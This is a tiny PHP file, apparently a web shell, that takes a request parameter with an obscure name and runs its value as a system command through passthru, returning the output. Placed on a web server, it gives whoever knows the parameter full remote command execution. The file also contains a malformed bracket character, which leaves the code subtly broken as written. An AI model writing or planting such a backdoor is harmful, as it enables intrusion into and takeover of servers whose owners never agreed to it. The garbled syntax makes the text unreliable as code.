<?php
passthru($_GET['o-YZAPw_'〕);
?>
